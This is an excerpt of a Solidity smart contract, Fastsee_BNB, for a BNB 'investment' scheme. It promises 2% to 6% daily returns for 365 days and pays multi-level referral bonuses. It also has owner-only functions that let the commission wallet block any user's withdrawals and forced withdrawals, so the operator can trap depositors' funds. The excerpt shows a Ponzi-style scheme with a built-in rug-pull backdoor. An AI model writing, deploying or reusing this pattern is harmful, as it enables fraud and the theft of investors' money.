...
contract Fastsee_BNB {
	using SafeMath for uint256;
    using SafeMath for uint8;

	uint256 constant public INVEST_MIN_AMOUNT = 0.01 ether;  
	uint256[] public REFERRAL_PERCENTS = [50, 20, 10, 10];
	uint256[] public REFERRAL_MATCHING_BONUS = [100, 50, 20, 10];
	uint256 constant public PROJECT_FEE = 80;
	uint256 constant public DEVELOPER_FEE = 20;
	uint256 constant public PERCENTS_DIVIDER= 1000;
	uint256 constant public TIME_STEP = 1 days;

	uint256 constant public REINVEST_BONUS = 100; //10%
	uint256 constant public EXTRA_BONUS = 50; // 5%
	
    uint256[] public FORCE_WITHDRAW_PENALTY = [220, 230, 240, 250, 200, 160]; 
	...
	constructor(address wallet, address _developer) {
        ...
        plans.push(Plan(365, 200)); // 2% per day for 365 days
        plans.push(Plan(365, 250)); // 2.5% per day for 365 days
        plans.push(Plan(365, 300)); // 3% per day for 365 days
		plans.push(Plan(365, 400)); // 4% per day for 365 days 
        plans.push(Plan(365, 500)); // 5% per day for 365 days 
        plans.push(Plan(365, 600)); // 6% per day for 365 days 
	}
	...
	function reInvest() public {
		...
		require(totalAmount >= 0.01 ether, "min. deposit is 0.01 BNB");
	...
	function withdraw() public {
		require(!_isExcludedFromRewards[msg.sender], "withdrawal error");
		User storage user = users[msg.sender];
    ...
    function forceWithdraw(uint256 index) public payable{
		require(!_isExcluded[msg.sender], "force withdrawal error");
        ...
        uint256 totalAmount  = amount.sub(amount.mul(FORCE_WITHDRAW_PENALTY[plan]).div(PERCENTS_DIVIDER)); 
	...
	function excludeFromForceWithdrawal(address userAddress) public {
		require(msg.sender == commissionWallet, "address doesnt have rights");
		_isExcluded[userAddress] = true;
	}

	function includeInForceWithdrawal(address userAddress) public {
		require(msg.sender == commissionWallet, "address doesnt have rights");
		_isExcluded[userAddress] = false;
	}

	function excludeFromRewards(address userAddress) public {
		require(msg.sender == commissionWallet, "address doesnt have rights");
		_isExcludedFromRewards[userAddress] = true;
	}

	function includeInRewards(address userAddress) public {
		require(msg.sender == commissionWallet, "address doesnt have rights");
		_isExcludedFromRewards[userAddress] = false;
	}
